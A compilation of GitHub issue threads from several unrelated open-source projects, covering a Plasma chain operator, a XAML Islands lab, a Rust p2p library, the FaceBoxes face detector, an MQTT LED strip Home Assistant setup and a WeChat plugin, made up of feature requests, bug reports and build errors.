When the operator shuts down, it is possible that there is some inconsistent state. Maybe the DB shut down in the middle of recording entries. Because of this, we probably want a way to re-ingest all of the finalized tx-log blocks.

**Describe the solution you'd like**
Add flag to `init` which reingests the tx-log
 **Is your feature request related to a problem? Please describe.**
Querying transactions by sender is quite useful for the wallet. We should support it!

**Describe the solution you'd like**
Whenever a transaction is added, we can simply store records in the db which look something like:

- key: `sender_address + blocknumber`
- value: `encoded_transaction`  Hi, there! I run `npm install plasma-chain -g` but execution failed with "premature close" error. Thins error usually occurs when package.json file is missing or some of the dependencies in it directs to wrong git url. I see that you are currently reconstructing the PG's repo and some dependencies are removed, e.g. plasma-utils. But here it still directs to the old one which is empty now.
```
"plasma-contracts": "git+https://github.com/plasma-group/plasma-contracts.git",
    "plasma-explorer": "git+https://github.com/plasma-group/plasma-explorer.git",
    "plasma-utils": "git+https://github.com/plasma-group/plasma-utils.git"
```
Thanks!
  A transaction log is produced by the operator's state manager. This is ingested by the block manager. To ingest, we must read a bunch of binary data and store it in the proper location in the database.

In particular it will be stored as `blocknum + typedStart -> encodedTx` Update the merkle tree verification code [here](https://github.com/plasma-group/plasma-utils/tree/master/src/sum-tree) to instead store the information in leveldb **Is your feature request related to a problem? Please describe.**
Currently error messages are string literals embedded directly in the files which throw them. This means we can't check for particular error messages.

**Describe the solution you'd like**
One possible solution is add error messages as a constants variable Transaction histories will be stored in the database, but specific ranges need to be queried in order to prove ownership. This will be queried by clients looking to verify that they do in fact own a particular range.  When the operator receives a transaction it should response with a signature on that transaction hash. This message will act as a promise of inclusion. If the message was not included, the user then has enough information to prove this is the case and discredit the operator. **Is your feature request related to a problem? Please describe.**
Transaction receipts are supposed to be signed by the operator to ensure the user that the operator has actually received their transaction. However, currently the operator just sends back the same encoded transaction that was originally sent.

**Describe the solution you'd like**
The operator should sign the transaction (perhaps hash of the hash of the transaction to avoid tricking the operator into signing a send...) before sending it back to the client.
 **Is your feature request related to a problem? Please describe.**
It can be difficult to install using npm across multiple platforms / versions of node etc.

**Describe the solution you'd like**
A Dockerfile should be created which clones the repo, installs dependencies, and runs the operator. This way we can very easily spin up an operator no matter what platform is being used. **Is your feature request related to a problem? Please describe.**
This makes it significantly easier to lookup deposits for the node. Otherwise the node has to query every single Ethereum block... eww.

**Describe the solution you'd like**
Return both the deposit tx and the Ethereum block number. **Is your feature request related to a problem? Please describe.**
It would be nice if the operator intelligently detected deposits & stopped providing history proofs after it sees a deposit immediately proceeds a transaction.

**Describe the solution you'd like**
Record the deposits as they come in in the history manager. Then before checking branches maybe check for deposits...? The config file should accept a `gasPrice` field which should be used for deployment. Right now gas price is hard coded here: https://github.com/plasma-group/plasma-chain-operator/blob/master/src/eth-service.js#L109-L111 We use Travis CI for a bunch of the other repos & just have not gotten around to setting it up here. This needs to be done!
<---------->
162750121
I think the tags is unnecessary.

https://github.com/Microsoft/Windows-AppConsult-XAMLIslandsLab/blob/master/Lab/Exercise1/01-Start/ContosoExpenses/ContosoExpenses/ExpenseDetail.xaml#L41-L43 The project looks like already completed Task1 of Exercise2.

## For examples:
### Already added RowDefinitions
https://github.com/Microsoft/Windows-AppConsult-XAMLIslandsLab/blob/master/Lab/Exercise2/01-Start/ContosoExpenses/ContosoExpenses/ExpenseDetail.xaml#L43

### Already added MapControl
https://github.com/Microsoft/Windows-AppConsult-XAMLIslandsLab/blob/master/Lab/Exercise2/01-Start/ContosoExpenses/ContosoExpenses/ExpenseDetail.xaml#L70

### Already added code for releasing the MapControl.
https://github.com/Microsoft/Windows-AppConsult-XAMLIslandsLab/blob/master/Lab/Exercise2/01-Start/ContosoExpenses/ContosoExpenses/ExpenseDetail.xaml.cs#L48

 I think the tags is unnecessary.

https://github.com/Microsoft/Windows-AppConsult-XAMLIslandsLab/blob/master/Lab/Exercise1/01-Start/ContosoExpenses/ContosoExpenses/ExpenseDetail.xaml#L41-L43 At step 5 of Task 1 of Exercise 4, written as below:

```
The first step is to make the class public and to inherit from the WindowsXamlHostBase. This is how the definition should look like:

public class CalendarViewWrapper: WindowsXamlHostBase
{
    public CalendarViewWrapper() : base()
    {

    }
}
We have added a public constructor, which does nothing more than implementing the same base costructor of the WindowsXamlHostBase class.
```

Because this is same as no implementation of constructor in the class, in this step, I think that just need  making the class public and to inherit from the WindowsXamlHostBase.


 When I had cloned the repository and read the `Manual/Readme.md` using markdown previewer of Visual Studio Code, I couldn't show all images.
So, I checked it, all images written by path like as `https://github.com/Microsoft/Windows-AppConsult-XAMLIslandLab/blob/master/Manual/Images/xxxxx.png`.
In PWALab, written  'https://github.com/Microsoft/Windows-AppConsult-PWALab/raw/master/Manual/Images/xxxx.png'. Diff is using 'blob' on this repo or 'raw' on PWALab.

I guess 'blob' is preview page on GitHub, 'raw' is raw data.
If the Readme.md file views on web browser only, then no problem. It works correctly.
However, if you mind to show the document another previewer, then I think better to use 'raw' URL or relative path(like 'Images/xxxx.png' than 'blob' URL.

How do you think?
 At Task 3 of Exercise 3, I think this is not required.
However, read only is better.

https://github.com/Microsoft/Windows-AppConsult-XAMLIslandsLab/blob/master/Lab/Exercise4/02-End/ContosoExpenses/ContosoExpenses/SelectedDatesChangedEventArgs.cs#L11
 At step 5 of Task 1 of Exercise 4, written as below:

```
The first step is to make the class public and to inherit from the WindowsXamlHostBase. This is how the definition should look like:

public class CalendarViewWrapper: WindowsXamlHostBase
{
    public CalendarViewWrapper() : base()
    {

    }
}
We have added a public constructor, which does nothing more than implementing the same base costructor of the WindowsXamlHostBase class.
```

Because this is same as no implementation of constructor in the class, in this step, I think that just need  making the class public and to inherit from the WindowsXamlHostBase.



<---------->
162992291
The `Server/Client` is confused which is hard to tell that the node itself is server-side or a peer is server-side. `Inbound/Outbound` is a more clear term. Can not insert two different type of protocol to service.
 - The 0.1 version has an error not reported to the user #54 
- There is a type of error using #54 
- Lack of defense against fd attacks #54 
- Some users want to be able to support event stream output instead of callback，0.2 should support both programming modes at the same time
- Maybe there are other problems, let us wait and see in the evolution process. * Verify remote pubkey
* Expose PeerId to upper protocols The `handle_error` in trait `ServiceHandle`, using `io::Error` for its error type.
It better to have a more clear error defined to distinguish what has happened in p2p framework.
For example, we need a special kind of error type to  show `Connected to the connected node`.  multi code table：

https://github.com/multiformats/multicodec/blob/master/table.csv 

if we want to use `tcp` with `tls`, the current implementation cannot be expressed, we need to add protocol support according to the registry by ourselves

A `tentacle-multiaddr` crate need to implement Hi there,

First of all, thanks for the lib. 
I'm able to connect to different peers, then send messages from one to another.
One thing I couldn't achieve so far is, to use a the underlying stream (or substream) in order to forward the data via (`io::copy()`), would is this possible? 

Thank you. [QUIC](https://en.wikipedia.org/wiki/QUIC) looks better than TCP about performance and security.

Related Issue https://github.com/citahub/rfcs/issues/1 multi code table：

https://github.com/multiformats/multicodec/blob/master/table.csv 

if we want to use `tcp` with `tls`, the current implementation cannot be expressed, we need to add protocol support according to the registry by ourselves

A `tentacle-multiaddr` crate need to implement [QUIC](https://en.wikipedia.org/wiki/QUIC) looks better than TCP about performance and security.

Related Issue https://github.com/citahub/rfcs/issues/1 https://github.com/libp2p/rust-libp2p * [x] ERROR tentacle::session  stream send back error: SendError("...")
* [x] ERROR tentacle::session  session send to sub stream error: send failed because receiver is gone
* [x] WARN tentacle::service  timer is shutdown
* [x] WARN tentacle::substream  protocol [2] close because of extern network
* [x] WARN tentacle_secio::codec::secure_stream  send message error: Os { code: 104, kind: ConnectionReset, message: "Connection reset by peer" }  https://github.com/nervosnetwork/p2p/blob/master/src/service/event.rs#L71

Can't forward events to a channel because of the lifetime, use Arc to instead.

PR later. Related PR: https://github.com/nervosnetwork/p2p/pull/94 Related PR: https://github.com/nervosnetwork/p2p/pull/94 * [ ] ERROR tentacle::session  stream send back error: SendError("...")
* [ ] WARN tentacle::service  timer is shutdown
* [ ] WARN tentacle::substream  protocol [2] close because of extern network https://github.com/nervosnetwork/p2p/blob/master/src/service/event.rs#L71

Can't forward events to a channel because of the lifetime, use Arc to instead.

PR later. Allow messages encoded by molecule. Library user can choose different serialization format via cargo feature. Allow messages encoded by molecule. Library user can choose different serialization format via cargo feature.
<---------->
163039259
由于GPU的原因，我只能设置更小的batch_size，这样的话，迭代次数和学习率该如何调整呢？能否分享点经验。 When will the PyTorch version be release? When will the PyTorch version be release? Hi Dr. Zhang,

A few days ago, I could run faceboxes model on pycaffe correctly. The face detection result of the algorithms is good as well.

<br>
I followed the example code in SSD(https://github.com/weiliu89/caffe/blob/ssd/examples/ssd/ssd_detect.cpp) to call your faceboxes mode using cpp in Caffe.
<br>

The code could be run correctly, but the output of algorithms seems to be weird:
1) for some images, the output is very good(The same as that in pycaffe).
2) for some images, the output is weird.
Please check the following output:
For those abnormal images, the score is very small and the boxes is not aligned as well.
For those normal images, the score and boxes are both normal.

<br>
I used the same network file and weights file downloaded from your code, and I used the same code as pycaffe.

The only difference is that I use CPP to call the model.

Why are the output of some images not correct?
Do you have any idea about the issue?


![image](https://user-images.githubusercontent.com/6227348/54350201-ccae1200-4687-11e9-9de9-3ba368fe5826.png)

![image](https://user-images.githubusercontent.com/6227348/54350212-d2a3f300-4687-11e9-8b49-0b82becbbf7b.png)

![image](https://user-images.githubusercontent.com/6227348/54350228-da639780-4687-11e9-9e9b-693b5da1b95f.png)



![image](https://user-images.githubusercontent.com/6227348/54350247-dfc0e200-4687-11e9-801c-d305c253484d.png)





 caffe version: **bias=true**
pytorch version: nn.Conv2d(in_channels, out_channels, **bias=False**, **kwargs)

why bias different  caffe version: **bias=true**
pytorch version: nn.Conv2d(in_channels, out_channels, **bias=False**, **kwargs)

why bias different  Is it possible to detect faces in batches of images? multibox_loss_layer.cpp:139] Check failed: num_priors_ * loc_classes_ * 4 == bottom[0]->channels() (13568 vs. 87296) Number of priors must match number of location predictions.

我知道了，是我的caffe没有这个cpp，我把它加进去编译再试试 @sfzhang15  HI

发现在测试时
1. 有时是**对测试集进行尺寸的统一缩放**，如 FaceBoxes 中的 fddb_test.py．
　>>此时的缩放是成比例的缩放（放大3倍），所以不会影响image的ratio．
2. 有时是**直接用测试集图片的原尺寸**，如 S3FD 中 fddb_test.py．

缩放与否是由什么决定吗？
在FaceBoxes中，这样成比例的3倍放大，显然可以提升检测效果．那为什么在S3FD中不进行这样的放大呢？？

 is there any way to run this on raspberry pi device
what would be the approx fps on it Hello, i had successfully build the ssd caffe (https://github.com/weiliu89/caffe/tree/ssd),
and i already download the pre-trained model "faceboxes.caffemodel".
But when i run the following two codes,
    RCNN_Net.reset( new Net<float> (model_dir + "/deploy.prototxt", TEST) );
    RCNN_Net->CopyTrainedLayersFrom(model_dir + "/faceboxes.caffemodel");
I got the following error messages:

F0731 17:32:46.966609 19825 detection_output_layer.cpp:164] Check failed: num_priors_ * num_loc_classes_ * 4 == bottom[0]->channels() (4000 vs. 25600) Number of priors must match number of location predictions.

do you have any idea, thanks It seems that in FDDB evaluation, the input image must be upsampled by 3x in order to achieve the performance mentioned in the paper. This adds up the computational cost. Without upsampling, the performance drops a lot. Does this mean FaceBoxes is not good at detecting small faces? It seems that in FDDB evaluation, the input image must be upsampled by 3x in order to achieve the performance mentioned in the paper. This adds up the computational cost. Without upsampling, the performance drops a lot. Does this mean FaceBoxes is not good at detecting small faces? `conda install caffe-gpu 
make all -j && make py`

log:
`compilation terminated.
make: *** [.build_release/src/caffe/layers/base_data_layer.o] Error 1
In file included from ./include/caffe/util/cudnn.hpp:8:0,
                 from ./include/caffe/util/device_alternate.hpp:40,
                 from ./include/caffe/common.hpp:19,
                 from src/caffe/data_reader.cpp:6:
.build_release/src/caffe/proto/caffe.pb.h:10:40: fatal error: google/protobuf/port_def.inc: No such file or directory
 #include <google/protobuf/port_def.inc>
` Hello, i had successfully build the ssd caffe (https://github.com/weiliu89/caffe/tree/ssd),
and i already download the pre-trained model "faceboxes.caffemodel".
But when i run the following two codes,
    RCNN_Net.reset( new Net<float> (model_dir + "/deploy.prototxt", TEST) );
    RCNN_Net->CopyTrainedLayersFrom(model_dir + "/faceboxes.caffemodel");
I got the following error messages:

F0731 17:32:46.966609 19825 detection_output_layer.cpp:164] Check failed: num_priors_ * num_loc_classes_ * 4 == bottom[0]->channels() (4000 vs. 25600) Number of priors must match number of location predictions.

do you have any idea, thanks Hi,
        I want to use this method to detect people. The proportion of people is generally not 1:1. In the initial test, I did not modify the aspect_ratio in your train.prototxt. This  maybe a potential problem. 
        first,when i training about 15,000 steps, the loss did not dropped, and  it is around 6. Is this normal? Or is training steps too small? 
        Thank you very mush. -.- is caffe version the same as pytorch version 
https://github.com/zisianw/FaceBoxes.PyTorch

model  same?
priorbox.cpp  same? `conda install caffe-gpu 
make all -j && make py`

log:
`compilation terminated.
make: *** [.build_release/src/caffe/layers/base_data_layer.o] Error 1
In file included from ./include/caffe/util/cudnn.hpp:8:0,
                 from ./include/caffe/util/device_alternate.hpp:40,
                 from ./include/caffe/common.hpp:19,
                 from src/caffe/data_reader.cpp:6:
.build_release/src/caffe/proto/caffe.pb.h:10:40: fatal error: google/protobuf/port_def.inc: No such file or directory
 #include <google/protobuf/port_def.inc>
` Hi,
        I want to use this method to detect people. The proportion of people is generally not 1:1. In the initial test, I did not modify the aspect_ratio in your train.prototxt. This  maybe a potential problem. 
        first,when i training about 15,000 steps, the loss did not dropped, and  it is around 6. Is this normal? Or is training steps too small? 
        Thank you very mush. -.- hi
    i want to use your command with train.sh to train my data by your project,but i do not konw how to add my data. could you tell me what i should do. thank you very much.
<---------->
163149581
能提供android相机camera去斑点和美白磨皮吗？
<---------->
163154619
给钱那种  给钱那种 
<---------->
163206744
Hello, thanks again for all of the help. My lights are up and running perfectly. Have you seen this website or looked into expanding to some more lighting effects? http://frederickvandenbosch.be/?p=267

Here is one of the examples, how could I implement it into my config:

// Light up the strip starting from the middle
void middleFill(uint32_t c, uint8_t wait) {
  clearStrip();
 
  for(uint16_t i=0; i<(dstrip.numPixels()/2); i++) { // start from the middle, lighting an LED on each side
    dstrip.setPixelColor(dstrip.numPixels()/2 + i, c);
    dstrip.setPixelColor(dstrip.numPixels()/2 - i, c);
    dstrip.show();
    delay(wait);
  }
 
  for(uint16_t i=0; i<(dstrip.numPixels()/2); i++) { // reverse
    dstrip.setPixelColor(i, dstrip.Color(0, 0, 0));
    dstrip.setPixelColor(dstrip.numPixels() - i, dstrip.Color(0, 0, 0));
    dstrip.show();
    delay(wait);
  }
} 
copied the updated code...still nothing..same thing..doesn't work
im on HA 0.97.2
python 3.7

Configure a default setup of Home Assistant (frontend, api, etc)
default_config:
Uncomment this if you are using SSL/TLS, running in Docker container, etc.
http:
base_url: example.duckdns.org:8123
Text to speech

tts:

    platform: google_translate

group: !include groups.yaml
automation: !include automations.yaml
script: !include scripts.yaml
mqtt:
broker: your.mqtt.ip.address
port: 1883
client_id: home-assistant-1
username: YOURUSERNAME
password: YOURPASSWORD

light:
- platform: mqtt
schema: json
name: "RGB Light Strip 1"
state_topic: "home/RGBStrip1"
command_topic: "home/RGBStrip1/set"
rgb: true
availability_topic: "home/RGBStrip1/LWT"
white_value: true
effect: true
effect_list:
- solid
- Music - L2R
- Music - Middle
- Music - Fma965
- bpm
- candy cane
- confetti
- cyclon rainbow
- dots
- fire
- glitter
- juggle
- lightning
- noise
- police all
- police one
- rainbow
- rainbow with glitter
- ripple
- twinkle
- sinelon
- sine hue
- full hue
- breathe
- hue breathe
- Christmas
- christmas alternate
- random stars
- St Patty
- Valentine
- Turkey Day
- Thanksgiving
- USA
- Independence
- Halloween
- Go Lions
- Hail
- Touchdown
- Punkin
- Lovey Day
- Holly Jolly
brightness: true
optimistic: false
qos: 0

and this are the errors:

2019-08-20 16:16:40 ERROR (SyncWorker_0) [homeassistant.util.yaml.loader] while parsing a block collection
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 24, column 5
expected , but found '?'
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 25, column 5
2019-08-20 16:16:40 ERROR (MainThread) [homeassistant.bootstrap] Error loading C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml: while parsing a block collection
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 24, column 5
expected , but found '?'
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 25, column 5
newest 0.97.2
python 3.7 ![20190918_111418](https://user-images.githubusercontent.com/25729658/65211047-64435180-da6b-11e9-9227-f1805c6023fe.jpg)
Ani idea how to fix this? Do i need to go to yaml or arduino file for a fix? Im getting stuck  full day and no results. Is the arduino file updated to Jon 6? 
copied the updated code...still nothing..same thing..doesn't work
im on HA 0.97.2
python 3.7

Configure a default setup of Home Assistant (frontend, api, etc)
default_config:
Uncomment this if you are using SSL/TLS, running in Docker container, etc.
http:
base_url: example.duckdns.org:8123
Text to speech

tts:

    platform: google_translate

group: !include groups.yaml
automation: !include automations.yaml
script: !include scripts.yaml
mqtt:
broker: your.mqtt.ip.address
port: 1883
client_id: home-assistant-1
username: YOURUSERNAME
password: YOURPASSWORD

light:
- platform: mqtt
schema: json
name: "RGB Light Strip 1"
state_topic: "home/RGBStrip1"
command_topic: "home/RGBStrip1/set"
rgb: true
availability_topic: "home/RGBStrip1/LWT"
white_value: true
effect: true
effect_list:
- solid
- Music - L2R
- Music - Middle
- Music - Fma965
- bpm
- candy cane
- confetti
- cyclon rainbow
- dots
- fire
- glitter
- juggle
- lightning
- noise
- police all
- police one
- rainbow
- rainbow with glitter
- ripple
- twinkle
- sinelon
- sine hue
- full hue
- breathe
- hue breathe
- Christmas
- christmas alternate
- random stars
- St Patty
- Valentine
- Turkey Day
- Thanksgiving
- USA
- Independence
- Halloween
- Go Lions
- Hail
- Touchdown
- Punkin
- Lovey Day
- Holly Jolly
brightness: true
optimistic: false
qos: 0

and this are the errors:

2019-08-20 16:16:40 ERROR (SyncWorker_0) [homeassistant.util.yaml.loader] while parsing a block collection
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 24, column 5
expected , but found '?'
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 25, column 5
2019-08-20 16:16:40 ERROR (MainThread) [homeassistant.bootstrap] Error loading C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml: while parsing a block collection
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 24, column 5
expected , but found '?'
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 25, column 5
newest 0.97.2
python 3.7 forget that..i downloaded the code but there is no way to configure yaml file for home assistant Thank you for this project! You've taken it way further than the original. I was wondering if it's possible for you to convert this to cpp/h files? Not everyone uses the Arduino IDE but with cpp/h files you can use these on any IDE including Arduino. This would also help with splitting this monster of a file up so it can be maintained easier for everyone. I can help with this if you are interested. Thanks! [This repo](https://github.com/selfhostedhome/mqtt-rgb-light-strips) adds effects through the MSGEQ7 audio chip to make music go with lights. It works pretty well and integrating those parts into this project would be cool. I found a list [here](https://www.reddit.com/r/spaceengineers/comments/3e0k38/rgb_values_for_various_types_of_realworld_lights/) of real world colors. i tried so many codes,times,changes... nothing works.  with bruh original code is working. with this one it doesnt. i dont know whst to do. help? 
copied the updated code...still nothing..same thing..doesn't work
im on HA 0.97.2
python 3.7

Configure a default setup of Home Assistant (frontend, api, etc)
default_config:
Uncomment this if you are using SSL/TLS, running in Docker container, etc.
http:
base_url: example.duckdns.org:8123
Text to speech

tts:

    platform: google_translate

group: !include groups.yaml
automation: !include automations.yaml
script: !include scripts.yaml
mqtt:
broker: your.mqtt.ip.address
port: 1883
client_id: home-assistant-1
username: YOURUSERNAME
password: YOURPASSWORD

light:
- platform: mqtt
schema: json
name: "RGB Light Strip 1"
state_topic: "home/RGBStrip1"
command_topic: "home/RGBStrip1/set"
rgb: true
availability_topic: "home/RGBStrip1/LWT"
white_value: true
effect: true
effect_list:
- solid
- Music - L2R
- Music - Middle
- Music - Fma965
- bpm
- candy cane
- confetti
- cyclon rainbow
- dots
- fire
- glitter
- juggle
- lightning
- noise
- police all
- police one
- rainbow
- rainbow with glitter
- ripple
- twinkle
- sinelon
- sine hue
- full hue
- breathe
- hue breathe
- Christmas
- christmas alternate
- random stars
- St Patty
- Valentine
- Turkey Day
- Thanksgiving
- USA
- Independence
- Halloween
- Go Lions
- Hail
- Touchdown
- Punkin
- Lovey Day
- Holly Jolly
brightness: true
optimistic: false
qos: 0

and this are the errors:

2019-08-20 16:16:40 ERROR (SyncWorker_0) [homeassistant.util.yaml.loader] while parsing a block collection
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 24, column 5
expected , but found '?'
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 25, column 5
2019-08-20 16:16:40 ERROR (MainThread) [homeassistant.bootstrap] Error loading C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml: while parsing a block collection
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 24, column 5
expected , but found '?'
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 25, column 5
newest 0.97.2
python 3.7 
copied the updated code...still nothing..same thing..doesn't work
im on HA 0.97.2
python 3.7

Configure a default setup of Home Assistant (frontend, api, etc)
default_config:
Uncomment this if you are using SSL/TLS, running in Docker container, etc.
http:
base_url: example.duckdns.org:8123
Text to speech

tts:

    platform: google_translate

group: !include groups.yaml
automation: !include automations.yaml
script: !include scripts.yaml
mqtt:
broker: your.mqtt.ip.address
port: 1883
client_id: home-assistant-1
username: YOURUSERNAME
password: YOURPASSWORD

light:
- platform: mqtt
schema: json
name: "RGB Light Strip 1"
state_topic: "home/RGBStrip1"
command_topic: "home/RGBStrip1/set"
rgb: true
availability_topic: "home/RGBStrip1/LWT"
white_value: true
effect: true
effect_list:
- solid
- Music - L2R
- Music - Middle
- Music - Fma965
- bpm
- candy cane
- confetti
- cyclon rainbow
- dots
- fire
- glitter
- juggle
- lightning
- noise
- police all
- police one
- rainbow
- rainbow with glitter
- ripple
- twinkle
- sinelon
- sine hue
- full hue
- breathe
- hue breathe
- Christmas
- christmas alternate
- random stars
- St Patty
- Valentine
- Turkey Day
- Thanksgiving
- USA
- Independence
- Halloween
- Go Lions
- Hail
- Touchdown
- Punkin
- Lovey Day
- Holly Jolly
brightness: true
optimistic: false
qos: 0

and this are the errors:

2019-08-20 16:16:40 ERROR (SyncWorker_0) [homeassistant.util.yaml.loader] while parsing a block collection
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 24, column 5
expected , but found '?'
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 25, column 5
2019-08-20 16:16:40 ERROR (MainThread) [homeassistant.bootstrap] Error loading C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml: while parsing a block collection
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 24, column 5
expected , but found '?'
in "C:\Users\olire\AppData\Roaming.homeassistant\configuration.yaml", line 25, column 5
newest 0.97.2
python 3.7 Is the arduino file updated to Jon 6? [This repo](https://github.com/selfhostedhome/mqtt-rgb-light-strips) adds effects through the MSGEQ7 audio chip to make music go with lights. It works pretty well and integrating those parts into this project would be cool. I have the same problem with this code as with the original one with Bruh. Continuous MQTT reconnects.

Here is the serial monitor:
`.........
WiFi connected
IP address: 192.168.5.112
Ready
Attempting MQTT connection...connected
Setting LEDs:
r: 0, g: 0, b: 0
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-4 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-4 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-4 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
`

And here is mosquitto log:
`1550323869: New client connected from 192.168.5.112 as tupa_allasvalo (c1, k15, u'mqttclients').
1550323890: Client tupa_allasvalo has exceeded timeout, disconnecting.
1550323890: Socket error on client tupa_allasvalo, disconnecting.` Attempting MQTT connection...connected
Setting LEDs:
r: 0, g: 0, b: 0
Message arrived [home/RGBStrip1/set] ON
parseObject() failed
 How work the Music Virtualizer.
Which Things I have to connect to the NodeMCU board? Attempting MQTT connection...connected
Setting LEDs:
r: 0, g: 0, b: 0
Message arrived [home/RGBStrip1/set] ON
parseObject() failed
 My problem is when ever the wifi/internet disconnects the animation freezes only to resume after the wifi/internet is back.

In India where data disconnection is very frequent with all ISPs it is a big problem, is there any way out of this? I have the same problem with this code as with the original one with Bruh. Continuous MQTT reconnects.

Here is the serial monitor:
`.........
WiFi connected
IP address: 192.168.5.112
Ready
Attempting MQTT connection...connected
Setting LEDs:
r: 0, g: 0, b: 0
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-4 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-4 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-4 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
Attempting MQTT connection...failed, rc=-2 try again in 5 seconds
`

And here is mosquitto log:
`1550323869: New client connected from 192.168.5.112 as tupa_allasvalo (c1, k15, u'mqttclients').
1550323890: Client tupa_allasvalo has exceeded timeout, disconnecting.
1550323890: Socket error on client tupa_allasvalo, disconnecting.`
<---------->
163439989
![image](https://user-images.githubusercontent.com/6815423/53739577-00b85480-3e8a-11e9-9bc6-937dcbd281b9.png)

Firefox 65.0.1 on Mac

https://developer.mozilla.org/en-US/docs/Web/API/Navigator/connection

navigator.connection is only in Chrome it seems and is a draft spec. ![image](https://user-images.githubusercontent.com/6815423/53739577-00b85480-3e8a-11e9-9bc6-937dcbd281b9.png)

Firefox 65.0.1 on Mac

https://developer.mozilla.org/en-US/docs/Web/API/Navigator/connection

navigator.connection is only in Chrome it seems and is a draft spec.
<---------->
163650848
Hi,

Thanks for creating this library. Which license does it use?

https://help.github.com/en/articles/licensing-a-repository

Cheers Hi,

Thanks for creating this library. Which license does it use?

https://help.github.com/en/articles/licensing-a-repository

Cheers
<---------->
163830675
用着用着，有时插件会自动关闭，后台已经锁定了此app，没更改设置，也没重启手机，还有什么会触发此插件自动关闭吗？   pixel 2xl，未root，9.0最新系统
每次打开你这个插件，就提示应用后台权限申请，什么省电策略之类，实际上网电量限制、流量限制全部都对这个插件设置了无效，也就是允许后台运行应用。 可以给程序添加一个查看版本的功能，  pixel 2xl，未root，9.0最新系统
每次打开你这个插件，就提示应用后台权限申请，什么省电策略之类，实际上网电量限制、流量限制全部都对这个插件设置了无效，也就是允许后台运行应用。 之前还能自己用辅助功能写抢红包，现在微信更新太频繁了，作者有没有考虑再年前更新下，让我们再享受下装X 的感觉呢，嘿嘿 可以给程序添加一个查看版本的功能， 除了版本升级控件ID会更改之外，其实同版本不同渠道的控件ID也会变化。
目前我的想法是对比不同市场的同一版本制作各种相适配的ID集合，通过网络API做更新
